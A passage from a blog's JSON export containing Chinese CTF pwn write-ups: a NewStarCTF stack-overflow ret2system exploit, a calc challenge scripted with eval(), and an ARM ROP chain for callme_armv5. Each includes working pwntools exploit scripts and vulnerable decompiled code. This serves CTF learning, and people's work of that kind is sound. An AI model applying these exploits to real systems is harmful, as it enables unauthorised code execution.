class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;give me your name: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;your name: %s\\n&quot;</span>, buf);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;give me your age: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;your age: %s\\n&quot;</span>, buf);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;you are a girl ?\\nsusu give me your wechat number: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x40</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;waitting.....&quot;</span>);</span><br><span class=\"line\">  sleep(<span class=\"number\">1u</span>);</span><br><span class=\"line\">  close(<span class=\"number\">0</span>);</span><br><span class=\"line\">  close(<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> write(<span class=\"number\">2</span>, <span class=\"string\">&quot;hhhhh&quot;</span>, <span class=\"number\">5uLL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>buf的大小为0x20，有三次的输入机会，前两次都只能输入0x20，最后一次可以输入0x40。</p>\n<p><strong>总体思路就是：先通过前两次输入泄露栈上的内容，最后一次栈溢出调用system函数，执行我们放在栈上的指令。</strong></p>\n<p>因此我们需要泄露两个地址：程序基地址和栈地址。</p>\n<p>在调试中可以发现，在buff+0x18的地方有一个nop指令的地址，输入0x18个字节即可泄露出该指令的地址，从而得到程序基地址；而栈地址我们可以通过输入0x20字节泄露出rbp得到。</p>\n<p>之后通过pop rdi将“/bin/sh\\x00”在栈上的地址（这里要算一下）送到rdi中，调用system函数即可。</p>\n<p>然而没这么容易，在return之前有close(0)，close(1)两条指令，程序的输入流和输出流都被关闭了，我们即使get shell了也无法正常输入和输出，我们只能考虑把flag输出到stderr显示出来。</p>\n<p><strong>而linux中有一个sh指令，sh命令是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取。如果读取的内容不是sh命令，那么就会报错，文本中的内容就会一起在stderr中输出。</strong></p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc-2.31.so&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./pwn&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">25713</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p,<span class=\"string\">&quot;b main&quot;</span>)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\">padding=<span class=\"number\">0x28</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;give me your name: &#x27;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">elf_addr=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x128b</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;give me your age: &quot;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">stack_addr=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">buf_addr=stack_addr-<span class=\"number\">0x30</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]elf_addr: &quot;</span>,<span class=\"built_in\">hex</span>(elf_addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]stack_addr: &quot;</span>,<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]buf_addr: &quot;</span>,<span class=\"built_in\">hex</span>(buf_addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;read: &quot;</span>,<span class=\"built_in\">hex</span>(elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">sys_addr=elf_addr+<span class=\"number\">0x129d</span><span class=\"comment\"># 一开始的时候偏移找错了，找的应该是call system的地址，而不是system函数实际执行的地址。</span></span><br><span class=\"line\">ret=elf_addr+<span class=\"number\">0x000000000000101a</span></span><br><span class=\"line\">pop_rdi=elf_addr+<span class=\"number\">0x0000000000001423</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;you are a girl ?\\nsusu give me your wechat number: &quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#payload=&#x27;a&#x27;*0x8+p64(pop_rdi)+p64(buf_addr+0x30)+p64(sys_addr)+p64(buf_addr)+p64(leave)+&quot;cat flag &gt;&amp;2&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&quot;sh flag\\x00&quot;</span>.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)+p64(pop_rdi)+p64(buf_addr)+p64(sys_addr)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>NewStarCTF，利用了下linux中sh的小技巧</p>","more":"<p>64位栈溢出，没开canary，其他都开了。</p>\n<p>程序中有system，函数vuln中存在栈溢出漏洞。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;give me your name: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;your name: %s\\n&quot;</span>, buf);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;give me your age: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;your age: %s\\n&quot;</span>, buf);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;you are a girl ?\\nsusu give me your wechat number: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x40</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;waitting.....&quot;</span>);</span><br><span class=\"line\">  sleep(<span class=\"number\">1u</span>);</span><br><span class=\"line\">  close(<span class=\"number\">0</span>);</span><br><span class=\"line\">  close(<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> write(<span class=\"number\">2</span>, <span class=\"string\">&quot;hhhhh&quot;</span>, <span class=\"number\">5uLL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>buf的大小为0x20，有三次的输入机会，前两次都只能输入0x20，最后一次可以输入0x40。</p>\n<p><strong>总体思路就是：先通过前两次输入泄露栈上的内容，最后一次栈溢出调用system函数，执行我们放在栈上的指令。</strong></p>\n<p>因此我们需要泄露两个地址：程序基地址和栈地址。</p>\n<p>在调试中可以发现，在buff+0x18的地方有一个nop指令的地址，输入0x18个字节即可泄露出该指令的地址，从而得到程序基地址；而栈地址我们可以通过输入0x20字节泄露出rbp得到。</p>\n<p>之后通过pop rdi将“/bin/sh\\x00”在栈上的地址（这里要算一下）送到rdi中，调用system函数即可。</p>\n<p>然而没这么容易，在return之前有close(0)，close(1)两条指令，程序的输入流和输出流都被关闭了，我们即使get shell了也无法正常输入和输出，我们只能考虑把flag输出到stderr显示出来。</p>\n<p><strong>而linux中有一个sh指令，sh命令是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取。如果读取的内容不是sh命令，那么就会报错，文本中的内容就会一起在stderr中输出。</strong></p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc-2.31.so&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./pwn&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">25713</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p,<span class=\"string\">&quot;b main&quot;</span>)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\">padding=<span class=\"number\">0x28</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;give me your name: &#x27;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">elf_addr=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x128b</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;give me your age: &quot;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">stack_addr=u64(p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">buf_addr=stack_addr-<span class=\"number\">0x30</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]elf_addr: &quot;</span>,<span class=\"built_in\">hex</span>(elf_addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]stack_addr: &quot;</span>,<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]buf_addr: &quot;</span>,<span class=\"built_in\">hex</span>(buf_addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;read: &quot;</span>,<span class=\"built_in\">hex</span>(elf.plt[<span class=\"string\">&#x27;read&#x27;</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">sys_addr=elf_addr+<span class=\"number\">0x129d</span><span class=\"comment\"># 一开始的时候偏移找错了，找的应该是call system的地址，而不是system函数实际执行的地址。</span></span><br><span class=\"line\">ret=elf_addr+<span class=\"number\">0x000000000000101a</span></span><br><span class=\"line\">pop_rdi=elf_addr+<span class=\"number\">0x0000000000001423</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;you are a girl ?\\nsusu give me your wechat number: &quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#payload=&#x27;a&#x27;*0x8+p64(pop_rdi)+p64(buf_addr+0x30)+p64(sys_addr)+p64(buf_addr)+p64(leave)+&quot;cat flag &gt;&amp;2&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&quot;sh flag\\x00&quot;</span>.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)+p64(pop_rdi)+p64(buf_addr)+p64(sys_addr)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"NewStar calc","date":"2023-01-02T11:54:26.000Z","_content":"\nNewStarCTF，随机生成出一个计算题，连续做对100题就能get shell。\n\n随机生成出一个计算题，连续做对100题就能get shell。\n\n原本以为是要改seed来控制随机，结果发现改不了，而且自己写程序模拟也没有，因为他是按照当前时间来作为种子随机的。\n\n后面出了wp才发现，原来可以直接利用python的eval()函数自动计算。\n\n<!-- more -->\n\neval()函数会自动识别字符串为数学表达式，并返回计算结果，根据这个可以直接把结果输出。\n\n\n```python\nfrom pwn import*\nelf=ELF(\"./pwn\")\np=process(\"./pwn\")\n#p=remote()\n\nfor i in range(100):\n    p.recvuntil('answer?')\n    n = p.recvline().decode()\n    print(n)\n    \n    #strip()返回删除前导和尾随空格的字符串副本\n    #split('=')是以'='为分隔符分割字符串，分割后的不同部分放在一个列表中。\n    question = n.strip().split('=')[0]\n  \n  \n    if 'x' in question:\n        question = question.replace('x','*')\n  \n  \n    answer = str(eval(question))\n  \n  \n    p.sendline(answer)\np.interactive()\n```\n","source":"_posts/calc.md","raw":"---\ntitle: NewStar calc\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- python\n\n---\n\nNewStarCTF，随机生成出一个计算题，连续做对100题就能get shell。\n\n随机生成出一个计算题，连续做对100题就能get shell。\n\n原本以为是要改seed来控制随机，结果发现改不了，而且自己写程序模拟也没有，因为他是按照当前时间来作为种子随机的。\n\n后面出了wp才发现，原来可以直接利用python的eval()函数自动计算。\n\n<!-- more -->\n\neval()函数会自动识别字符串为数学表达式，并返回计算结果，根据这个可以直接把结果输出。\n\n\n```python\nfrom pwn import*\nelf=ELF(\"./pwn\")\np=process(\"./pwn\")\n#p=remote()\n\nfor i in range(100):\n    p.recvuntil('answer?')\n    n = p.recvline().decode()\n    print(n)\n    \n    #strip()返回删除前导和尾随空格的字符串副本\n    #split('=')是以'='为分隔符分割字符串，分割后的不同部分放在一个列表中。\n    question = n.strip().split('=')[0]\n  \n  \n    if 'x' in question:\n        question = question.replace('x','*')\n  \n  \n    answer = str(eval(question))\n  \n  \n    p.sendline(answer)\np.interactive()\n```\n","slug":"calc","published":1,"updated":"2023-01-02T16:16:10.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafr002s5oud099tcg3d","content":"<p>NewStarCTF，随机生成出一个计算题，连续做对100题就能get shell。</p>\n<p>随机生成出一个计算题，连续做对100题就能get shell。</p>\n<p>原本以为是要改seed来控制随机，结果发现改不了，而且自己写程序模拟也没有，因为他是按照当前时间来作为种子随机的。</p>\n<p>后面出了wp才发现，原来可以直接利用python的eval()函数自动计算。</p>\n<span id=\"more\"></span>\n\n<p>eval()函数会自动识别字符串为数学表达式，并返回计算结果，根据这个可以直接把结果输出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;answer?&#x27;</span>)</span><br><span class=\"line\">    n = p.recvline().decode()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(n)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#strip()返回删除前导和尾随空格的字符串副本</span></span><br><span class=\"line\">    <span class=\"comment\">#split(&#x27;=&#x27;)是以&#x27;=&#x27;为分隔符分割字符串，分割后的不同部分放在一个列表中。</span></span><br><span class=\"line\">    question = n.strip().split(<span class=\"string\">&#x27;=&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;x&#x27;</span> <span class=\"keyword\">in</span> question:</span><br><span class=\"line\">        question = question.replace(<span class=\"string\">&#x27;x&#x27;</span>,<span class=\"string\">&#x27;*&#x27;</span>)</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    answer = <span class=\"built_in\">str</span>(<span class=\"built_in\">eval</span>(question))</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    p.sendline(answer)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>NewStarCTF，随机生成出一个计算题，连续做对100题就能get shell。</p>\n<p>随机生成出一个计算题，连续做对100题就能get shell。</p>\n<p>原本以为是要改seed来控制随机，结果发现改不了，而且自己写程序模拟也没有，因为他是按照当前时间来作为种子随机的。</p>\n<p>后面出了wp才发现，原来可以直接利用python的eval()函数自动计算。</p>","more":"<p>eval()函数会自动识别字符串为数学表达式，并返回计算结果，根据这个可以直接把结果输出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;answer?&#x27;</span>)</span><br><span class=\"line\">    n = p.recvline().decode()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(n)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#strip()返回删除前导和尾随空格的字符串副本</span></span><br><span class=\"line\">    <span class=\"comment\">#split(&#x27;=&#x27;)是以&#x27;=&#x27;为分隔符分割字符串，分割后的不同部分放在一个列表中。</span></span><br><span class=\"line\">    question = n.strip().split(<span class=\"string\">&#x27;=&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;x&#x27;</span> <span class=\"keyword\">in</span> question:</span><br><span class=\"line\">        question = question.replace(<span class=\"string\">&#x27;x&#x27;</span>,<span class=\"string\">&#x27;*&#x27;</span>)</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    answer = <span class=\"built_in\">str</span>(<span class=\"built_in\">eval</span>(question))</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    p.sendline(answer)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"callme_armv5","date":"2023-03-23T11:40:15.000Z","_content":"\narm pwn入门题，arm下的简单ROP。\n<!-- more -->\n\n查壳：同32位动态链接，只开了NX\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/callme_armv5/callme_armv5'\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x10000)\n    RUNPATH:  b'.'\n```\n\n逆向：\n\n也是``pwnme`中有栈溢出，但`UsefulFunction`和`UsefulGadgets`有些意义不明。\n\n`pwnme`中提示我去看介绍，看了之后才明白\n\n>You must call the `callme_one()`, `callme_two()` and `callme_three()` functions in that order, each with the arguments `0xdeadbeef`, `0xcafebabe`, `0xd00df00d` e.g. `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)` to print the flag. \n\n我需要通过ROp走完`callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) -> callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d) -> callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d)`才能`cat flag`。\n\n`r0、r1、r2`分别控制第一、二、三个参数，还有这里要用elf.plt获取callme_xxx的地址，直接获取`BL callme_xxx`的不能正常跳到`callme_two`。\n\nexp:\n\n```sh\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='callme_armv5'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\np=process([\"qemu-arm\",\"-L\",\"/usr/arm-linux-gnueabi/\", \"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n\ncallme_one=0x00010864\ncallme_two=0x00010854\ncallme_three=0x00010844\n\npop_r0_r1_r2_lr_pc=0x00010870\n\nr()\npayload=b'a'*0x24+p32(pop_r0_r1_r2_lr_pc)\npayload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(pop_r0_r1_r2_lr_pc)+p32(elf.plt['callme_one'])\npayload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(pop_r0_r1_r2_lr_pc)+p32(elf.plt['callme_two'])\npayload+=p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d)+p32(elf.plt['callme_three'])*2\ns(payload)\n\nitr()\n```\n\n","source":"_posts/callme.md","raw":"---\ntitle: callme_armv5\ndate: 2023-03-23 19:40:15\ncategories: \n- pwn_wp\ntags: \n- pwn\n- arm\n- ROP\n\n---\n\narm pwn入门题，arm下的简单ROP。\n<!-- more -->\n\n查壳：同32位动态链接，只开了NX\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/callme_armv5/callme_armv5'\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x10000)\n    RUNPATH:  b'.'\n```\n\n逆向：\n\n也是``pwnme`中有栈溢出，但`UsefulFunction`和`UsefulGadgets`有些意义不明。\n\n`pwnme`中提示我去看介绍，看了之后才明白\n\n>You must call the `callme_one()`, `callme_two()` and `callme_three()` functions in that order, each with the arguments `0xdeadbeef`, `0xcafebabe`, `0xd00df00d` e.g. `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)` to print the flag. \n\n我需要通过ROp走完`callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) -> callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d) -> callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d)`才能`cat flag`。\n\n`r0、r1、r2`分别控制第一、二、三个参数，还有这里要用elf.plt获取callme_xxx的地址，直接获取`BL 